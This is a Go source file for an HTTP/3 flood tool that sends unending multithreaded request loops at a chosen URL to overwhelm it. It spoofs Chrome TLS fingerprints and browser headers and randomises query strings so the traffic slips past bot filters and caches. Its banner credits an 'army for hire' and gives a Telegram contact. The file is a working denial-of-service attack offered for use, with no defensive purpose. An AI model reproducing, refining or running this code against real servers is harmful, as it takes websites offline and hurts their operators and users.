

package main

import (
	"flag"
	"fmt"
	"log"

	"github.com/imroc/req/v3"

	"net/url"

	"time"

	"sync"

	"math/rand"

	"os"

	browser "github.com/eddycjy/fake-useragent"
)

var (
	wg      sync.WaitGroup
	proxies = []string{}

	target    string
	proxyfile string
	duration  int
	threads   int
	rps       int

	debug  bool
	random bool
)

var paths = []string{
	"page=1",
	"page=2",
	"page=3",
	"category=news",
	"category=sports",
	"category=technology",
	"category=entertainment",
	"sort=newest",
	"filter=popular",
	"limit=10",
}

func init() {
	flag.StringVar(&target, "url", "https://example.com:443", "Server URL")
	flag.IntVar(&duration, "time", 0, "Duration of attack")
	flag.IntVar(&threads, "threads", 10, "Concurrent threads")
	flag.IntVar(&rps, "rps", 64, "Requests per second")
	flag.BoolVar(&debug, "debug", false, "Debug response status code")
	flag.BoolVar(&random, "rand", false, "Randomize query string")
	flag.Parse()
}

func randomIntn(min, max int) int {
	return rand.Intn(max-min) + min
}

func randomString(length int) string {
	characters := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	result := make([]byte, length)
	for i := 0; i < length; i++ {
		result[i] = characters[rand.Intn(len(characters))]
	}
	return string(result)
}

func randomElement(elements []string) string {
	return elements[randomIntn(0, len(elements))]
}

func attack(client *req.Client, i int) {
reload:
	for k := 0; k < rps; k++ {
		request := client.R()
		if random {
			request.SetQueryString(fmt.Sprintf("%s&%s=%s", randomElement(paths), randomString(10), randomString(10)))
		}

		resp, err := request.
			SetHeaders(map[string]string{
				"Accept-Encoding":           "gzip, deflate, br",
				"Accept-Language":           "en-GB,en-US;q=0.9,en;q=0.8,nl;q=0.7",
				"Sec-Ch-Ua":                 "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
				"Sec-Ch-Ua-Mobile":          "?0",
				"Sec-Ch-Ua-Platform":        "\"macOS\"",
				"Sec-Fetch-Dest":            "document",
				"Sec-Fetch-Mode":            "navigate",
				"Sec-Fetch-Site":            "none",
				"Sec-Fetch-User":            "?1",
				"Upgrade-Insecure-Requests": "1",
				"User-Agent":                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
				"Referer":                   target,
			}).Get(target)

		if err != nil {
			goto reload
		}

		if resp.StatusCode >= 400 && resp.StatusCode != 404 {
			if debug {
				fmt.Printf(" (\033[33mthread %d\033[37m) Response: \033[31m%d\033[37m\n", i, resp.StatusCode)
			}
			time.Sleep(time.Millisecond * 50)
			goto reload
		} else {
			if debug {
				fmt.Printf(" (\033[33mthread %d\033[37m) Response: \033[32m%d\033[37m\n", i, resp.StatusCode)
			}
			goto reload
		}
	}
	defer wg.Done()
}

func build() *req.Client {
	client := req.C().
		ImpersonateChrome().
		EnableInsecureSkipVerify().
		SetTimeout(15 * time.Second).
		SetTLSFingerprintChrome().
		SetUserAgent(browser.Chrome())
		//SetProxyURL(fmt.Sprintf("http://%s", proxy))
	client.SetRedirectPolicy(
		req.MaxRedirectPolicy(10),
		req.SameDomainRedirectPolicy(),
	)
	client.EnableForceHTTP3()

	/*if debug {
		client.DevMode()
	}*/

	return client
}

func main() {

	rand.Seed(time.Now().UnixNano())

	fmt.Printf("\n\033[36m	HTTP3 flood (no proxy)\033[0m\n\n\033[37m	Released by \033[31mATLAS API corporation\033[0m\033[37m, an army for hire\033[0m\n\n\033[36m	Made by Benshii Varga (t.me/ATLASAPI)\033[0m\n\n")

	_, err := url.Parse(target)
	if err != nil {
		log.Fatalf("Failed to parse URL: %v", err)
	}

	for i := 0; i < threads; i++ {
		wg.Add(1)
		fmt.Printf(" \033[37m(\033[32m+\033[37m) Starting thread (\033[33m%d\033[37m)\n", i)
		client := build()
		go attack(client, i)
		time.Sleep(1 * time.Millisecond)
	}

	go func() {
		time.Sleep(time.Duration(duration) * time.Second)
		fmt.Println(" \033[37m(\033[31m!\033[37m) attack finished")
		os.Exit(0)
	}()
	wg.Wait()
}
